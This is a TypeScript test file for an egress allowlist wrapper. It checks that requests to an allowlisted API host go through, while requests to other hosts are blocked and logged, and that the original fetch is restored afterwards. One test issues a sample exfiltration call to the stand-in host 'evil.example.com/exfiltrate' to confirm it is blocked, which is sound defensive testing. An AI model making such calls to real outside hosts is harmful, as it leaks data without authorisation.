import { afterEach, describe, expect, it } from "bun:test";
import { hostOf, withEgressAllowlist } from "../../src/runtime/doctor/egress";

const originalFetch = globalThis.fetch;

afterEach(() => {
  // Guard against a leaked swap if an assertion throws mid-region.
  // eslint-disable-next-line unicorn/no-global-object-property-assignment
  globalThis.fetch = originalFetch;
});

describe("hostOf", () => {
  it("extracts the host from a base URL", () => {
    expect(hostOf("https://api.anthropic.com/v1")).toBe("api.anthropic.com");
  });
});

describe("withEgressAllowlist", () => {
  it("permits and records a request to an allowlisted host", async () => {
    const seen: string[] = [];
    // eslint-disable-next-line unicorn/no-global-object-property-assignment
    globalThis.fetch = Object.assign(
      async (input: Parameters<typeof fetch>[0]) => {
        seen.push(String(input));
        return new Response("ok");
      },
      { preconnect: originalFetch.preconnect },
    );
    const trace = await withEgressAllowlist(["api.anthropic.com"], async () => {
      const response = await fetch("https://api.anthropic.com/v1/messages");
      return response.text();
    });
    expect(trace.result).toBe("ok");
    expect(trace.contactedHosts).toEqual(["api.anthropic.com"]);
    expect(trace.violations).toEqual([]);
    expect(seen).toEqual(["https://api.anthropic.com/v1/messages"]);
  });

  it("blocks and records a request to a non-allowlisted host", async () => {
    let reached = false;
    // eslint-disable-next-line unicorn/no-global-object-property-assignment
    globalThis.fetch = Object.assign(
      async () => {
        reached = true;
        return new Response("should not happen");
      },
      { preconnect: originalFetch.preconnect },
    );
    let thrown: unknown;
    const trace = await withEgressAllowlist(["api.anthropic.com"], async () => {
      try {
        await fetch("https://evil.example.com/exfiltrate");
      } catch (error) {
        thrown = error;
      }
      return "done";
    });
    expect(reached).toBe(false);
    expect(thrown).toBeInstanceOf(Error);
    expect((thrown as Error).message).toContain("evil.example.com");
    expect(trace.violations).toEqual(["evil.example.com"]);
    expect(trace.contactedHosts).toEqual(["evil.example.com"]);
  });

  it("restores the original fetch after the region", async () => {
    await withEgressAllowlist(["api.anthropic.com"], async () => "noop");
    expect(globalThis.fetch).toBe(originalFetch);
  });

  it("restores the original fetch even when the region throws", async () => {
    await expect(
      withEgressAllowlist(["api.anthropic.com"], async () => {
        throw new Error("region failure");
      }),
    ).rejects.toThrow("region failure");
    expect(globalThis.fetch).toBe(originalFetch);
  });
});
